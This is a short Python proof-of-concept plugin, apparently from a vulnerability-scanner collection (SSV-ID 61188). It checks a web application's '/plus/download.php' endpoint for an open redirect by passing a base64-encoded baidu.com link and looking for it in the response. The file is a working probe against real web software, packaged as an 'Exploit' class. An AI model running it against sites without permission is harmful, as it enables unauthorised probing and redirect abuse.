#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = 'Ario'
#SSV-ID: 61188
import requests

def audit(arg):
    url = arg + "/plus/download.php?open=1&link=aHR0cDovL3d3dy5iYWlkdS5jb20%3D"
    response = requests.get(url, timeout=5)
    if response.status_code and "http://www.baidu.com" in response.text:
        return url


class Exploit(object):

    def attack(self, url):
        return audit(url)